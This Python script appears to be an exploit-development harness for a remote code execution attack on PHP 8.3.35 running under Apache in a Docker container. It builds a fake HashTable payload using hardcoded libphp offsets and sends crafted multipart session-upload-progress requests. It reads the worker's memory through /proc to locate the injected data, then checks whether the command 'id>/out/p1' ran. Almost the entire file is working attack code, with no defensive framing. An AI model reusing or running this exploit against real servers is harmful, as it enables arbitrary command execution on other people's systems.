import os
import subprocess, sys, time, os, struct, importlib.util

BASE = os.path.dirname(os.path.abspath(__file__))
c = "p2s8335"

def sh(cmd):
    return subprocess.run(cmd, shell=True, capture_output=True, text=True)

# Import the exploit module
spec = importlib.util.spec_from_file_location("exploit", os.path.join(BASE, "exploit.py"))
exploit_mod = importlib.util.module_from_spec(spec)
spec.loader.exec_module(exploit_mod)
Target = exploit_mod.Target
build_multipart = exploit_mod.build_multipart
SID = exploit_mod.SID
MAX_CMD = exploit_mod.MAX_CMD

def get_worker():
    r = sh(f'docker exec {c} sh -c "ps -eo pid,comm | grep apache2 | grep -v grep"')
    pids = [l.split()[0] for l in r.stdout.strip().splitlines() if l.strip()]
    worker_pid = pids[-1]
    r = sh(f'docker exec {c} sh -c "grep libphp /proc/{worker_pid}/maps 2>/dev/null | head -1"')
    B = int(r.stdout.strip().split("-")[0], 16)
    return worker_pid, B

pid = None  # global worker pid

def read_mem(addr, size):
    r = subprocess.run(
        f'docker exec {c} sh -c "dd if=/proc/{pid}/mem bs=1 skip={addr} count={size} 2>/dev/null"',
        shell=True, capture_output=True
    )
    return r.stdout

def dump_around(addr, label, B):
    print(f"\n=== {label} (R=0x{addr:x}) ===", flush=True)
    lines = []
    for off in range(-0x100, 0x101, 8):
        a = addr + off
        data = read_mem(a, 8)
        if len(data) < 8:
            continue
        w = struct.unpack("<Q", data)[0]
        marker = ""
        if w == 0:
            marker = "  <- zero"
        elif 0x700000000000 < w < 0x800000000000:
            if B <= w < B + 0x2000000:
                marker = f"  <- libphp+{w - B:#x}"
            else:
                marker = "  <- heap ptr"
        elif w in (1, 2, 7, 0x1A, 0x10, 0x106, 0x307, 15, 31, 48, 167, 55):
            marker = f"  <- small {w}"
        lines.append(f"  R+{off:+04x}: 0x{w:016x}{marker}")
    print("\n".join(lines), flush=True)

# --- 8.3.35 offsets ---
zif = 0x3ac080
dtor = 0x49ec50
htdata = 0x690d8

pid, B = get_worker()
ps_base = B + 0x10432a0
ps_hsv = ps_base + 0x150
print(f"[*] worker={pid} libphp_base={B:#x}", flush=True)
print(f"[*] ps_hsv={ps_hsv:#x}", flush=True)

# Build the fake payload
def build_fake_payload(htdata, zif, cmd=b"id>/out/p1"):
    if len(cmd) > MAX_CMD:
        cmd = cmd[:MAX_CMD]
    ht = bytearray(b"\x00" * 167)
    struct.pack_into("<II", ht, 0x00, 1, 7)
    struct.pack_into("<II", ht, 0x08, 0x10, 0xFFFFFFF8)
    struct.pack_into("<Q", ht, 0x10, htdata + 0x20)
    struct.pack_into("<II", ht, 0x18, 1, 1)
    struct.pack_into("<II", ht, 0x20, 8, 0)
    struct.pack_into("<Q", ht, 0x28, 0)
    struct.pack_into("<Q", ht, 0x30, zif)
    E = 0x20
    struct.pack_into("<Q", ht, E + 0x00, 0)
    struct.pack_into("<Q", ht, E + 0x08, 0)
    struct.pack_into("<Q", ht, E + 0x10, zif)
    struct.pack_into("<Q", ht, E + 0x18, 0)
    struct.pack_into("<Q", ht, E + 0x20, 0)
    struct.pack_into("<I", ht, E + 0x28, 0)
    struct.pack_into("<I", ht, E + 0x2C, 1)
    struct.pack_into("<Q", ht, E + 0x30, 0)
    struct.pack_into("<Q", ht, E + 0x38, 0)
    struct.pack_into("<I", ht, E + 0x40, 0)
    struct.pack_into("<Q", ht, E + 0x50, htdata + 0x80)
    struct.pack_into("<I", ht, E + 0x58, 6)
    struct.pack_into("<II", ht, 0x80, 1, 0x106)
    struct.pack_into("<Q", ht, 0x88, 0)
    struct.pack_into("<Q", ht, 0x90, len(cmd))
    ht[0x98:0x98 + len(cmd)] = cmd
    ht[0x98 + len(cmd)] = 0
    return bytes(ht)

ht = build_fake_payload(htdata, zif)
carrier = struct.pack("<II", 1, 0x1A) + struct.pack("<Q", htdata)[:7]
print(f"[*] carrier = {carrier.hex()}", flush=True)
print(f"[*] ht[0:32] = {ht[:32].hex()}", flush=True)

# --- Send request A (setup) ---
target = Target(f"http://127.0.0.1:80", timeout=120, verbose=False)
# Note: the container's apache is on port 80 internally, but we access via host port 18112
# Let's use the host port
target = Target("http://127.0.0.1:18112/index.php", timeout=120, verbose=False)

parts_a = [
    {"name": "PHPSESSID", "data": b"a" * 19},
    {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"p" * 3},
]
pads = [(31, 31)] * 6
for i, (nl, vl) in enumerate(pads):
    name = (f"p{i:0{nl - 1}d}" if nl > 0 else "")[:nl]
    parts_a.append({"name": name, "data": b"V" * vl})
parts_a.append({"name": "f", "filename": "a.txt", "data": b"A" * 64})
parts_a.append({"name": "big", "data": b"B" * (12 * 1024 * 1024)})

body_a = build_multipart(parts_a, b"S" * 17)
print(f"[*] Request A: {len(body_a)} bytes, {len(parts_a)} parts", flush=True)
resp_a = target.post(body_a, b"S" * 17, read_cap=1 << 20, timeout=120,
                      extra_headers={"Cookie": "PHPSESSID=" + "a" * 32})
print(f"[+] Request A response: {len(resp_a)} bytes", flush=True)
time.sleep(0.5)

# --- Capture R after request A ---
data = read_mem(ps_hsv, 16)
R = 0
if len(data) >= 16:
    R = struct.unpack("<Q", data[:8])[0]
    tinfo = struct.unpack("<I", data[8:12])[0]
    print(f"[+] R = 0x{R:016x}  type_info=0x{tinfo:04x}", flush=True)
    if R != 0:
        dump_around(R, "AFTER REQUEST A", B)
    else:
        print("[!] R is 0 (UNDEF) - session not active", flush=True)

# --- Send request B (write) ---
print(f"\n[*] Sending request B (write)...", flush=True)
parts_b = [
    {"name": "PHPSESSID", "data": SID},
    {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
]
for i in range(2):
    parts_b.append({"name": f"f{i:02d}", "data": b"F" * 15})
parts_b.append({"name": "g00", "data": carrier})
for i in range(15):
    parts_b.append({"name": f"a{i:030d}"[:31], "data": ht})

body_b = build_multipart(parts_b, b"B" * 10)
print(f"[*] Request B: {len(body_b)} bytes, {len(parts_b)} parts", flush=True)
resp_b = target.post(body_b, b"B" * 10, read_cap=65536, timeout=30)
print(f"[+] Request B response: {len(resp_b)} bytes", flush=True)
time.sleep(0.5)

# --- Dump heap around R after request B ---
if R != 0:
    dump_around(R, "AFTER REQUEST B", B)

# --- Search for the carrier data in the heap ---
print(f"\n[*] Searching for carrier data in heap...", flush=True)
if R != 0:
    search_start = R - 0x200000
    search_end = R + 0x200000
    found = []
    for off in range(0, search_end - search_start, 0x10000):
        chunk_start = search_start + off
        chunk = read_mem(chunk_start, 0x10000)
        if len(chunk) < 16:
            continue
        idx = chunk.find(carrier)
        while idx != -1:
            found.append(chunk_start + idx)
            idx = chunk.find(carrier, idx + 1)
    if found:
        print(f"[+] Carrier found at {len(found)} location(s):", flush=True)
        for f in found:
            rel = f - R
            print(f"    0x{f:016x}  (R+{rel:+d} = R+{rel:+x})", flush=True)
    else:
        print("[!] Carrier not found in heap search range", flush=True)

# --- Check if RCE worked ---
print(f"\n[*] Checking for RCE proof...", flush=True)
r = sh(f'docker exec {c} sh -c "cat /out/p1 2>/dev/null || cat /www/p1 2>/dev/null || cat /tmp/p1 2>/dev/null"')
if r.stdout.strip():
    print(f"[+] RCE PROOF: {r.stdout.strip()}", flush=True)
else:
    print(f"[-] No RCE proof found", flush=True)

print(f"\n[*] Done.", flush=True)
